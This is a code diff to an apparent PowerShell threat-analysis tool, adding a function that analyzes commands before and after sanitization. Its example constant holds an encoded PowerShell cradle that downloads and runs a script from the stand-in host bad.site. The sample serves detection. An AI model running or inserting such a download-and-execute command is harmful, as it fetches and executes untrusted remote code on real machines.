@@ -12,6 +12,9 @@ from config.settings import CACHE_DURATION
 # Detector registry - add new detectors in services/detectors/__init__.py
 from services import detectors
 
+# Sanitization module for pre-analysis command processing
+from services.sanitization import apply_sanitization, get_detected_indicator_names
+
 # ✅ Example command that doesn't count towards quota
 EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'
 
@@ -481,6 +484,52 @@ def analyze_command_patterns(command: str, signatures: list) -> dict:
         "decoded_command": first_decoded,
         "double_decoded_command": double_decoded
     }
+
+
+def analyze_with_sanitization(command: str, signatures: list) -> dict:
+    """
+    Analyzes PowerShell command with conditional sanitization.
+    
+    First analyzes the raw command, then applies sanitization methods
+    that are triggered by specific indicators. If sanitization reveals
+    new indicators, uses the sanitized version.
+    
+    Args:
+        command: Raw PowerShell command to analyze
+        signatures: List of signature dictionaries to match against
+        
+    Returns:
+        dict: Analysis results with sanitization info included
+    """
+    # Helper function to extract indicator names from analysis
+    def get_indicators(cmd: str) -> list[str]:
+        result = analyze_command_patterns(cmd, signatures)
+        return get_detected_indicator_names(result)
+    
+    # Apply conditional sanitization
+    sanitization_result = apply_sanitization(command, get_indicators)
+    
+    # If sanitization was applied, analyze the sanitized command
+    if sanitization_result["was_sanitized"]:
+        final_command = sanitization_result["sanitized_command"]
+        analysis_result = analyze_command_patterns(final_command, signatures)
+        
+        # Add sanitization metadata to the result
+        analysis_result["sanitization"] = {
+            "was_sanitized": True,
+            "original_command": command,
+            "applied_methods": sanitization_result["applied_sanitizations"]
+        }
+    else:
+        # No sanitization needed, analyze original command
+        analysis_result = analyze_command_patterns(command, signatures)
+        analysis_result["sanitization"] = {
+            "was_sanitized": False,
+            "original_command": command,
+            "applied_methods": []
+        }
+    
+    return analysis_result
 
 
 def calculate_severity_and_risk(total_score: float) -> str:
